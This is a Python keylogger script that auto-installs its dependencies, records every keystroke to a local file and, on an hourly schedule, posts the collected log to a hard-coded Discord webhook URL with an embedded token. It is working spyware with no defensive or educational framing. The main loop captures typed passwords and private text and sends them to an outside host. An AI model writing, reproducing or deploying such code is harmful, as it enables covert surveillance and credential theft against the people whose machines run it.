from pynput import keyboard
import requests
import json
import schedule
import time
import subprocess
import pkg_resources

# installs required packages
required_packages = ['pynput', 'requests', 'schedule']
for package in required_packages:
    try: 
        dist = pkg_resources.get_distribution(package)
        print(f"{package} is installed")
    except pkg_resources.DistributionNotFound:
        print(f"{package} is not installed, attempting to install...")
        subprocess.call(['pip', 'install', package])


# sends the file through discordwebhook to your discord sever
file_log = "keyfile.txt"
def send_to_discord(file_log):
    with open(file_log, 'r') as file:
        data = file.read()
    webhook_url = 'https://discord.com/api/webhooks/1214534715692810251/FWN6gpaygdh6o4M8hg975ViHpYs-aOuNviGzWQkc_kJPxLCUV3_4MTRZWwuGBCjFWFMb'
    requests.post(webhook_url, data=json.dumps({"content": data}), headers={"Content-Type": "application/json"})

# main keylog function
def keyPressed(key):
    print(str(key))
    # Erase functionality
    if key == keyboard.Key.backspace:
        with open(file_log, 'r+') as logKey:
            content = logKey.read()
            logKey.seek(0)
            logKey.write(content[:-1]) #removes index with 1
            logKey.truncate()
    else: 
        # spacebar functionality
        with open(file_log, 'a') as logKey:
            try:
                if key == keyboard.Key.space:
                    logKey.write(' ') 
                else:

                    char = key.char
                    logKey.write(char) 
            except AttributeError:
                print("Error getting char")
schedule.every().hour.do(send_to_discord, file_log=file_log)
# runs the script
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    while True:
        schedule.run_pending()
        time.sleep(1)
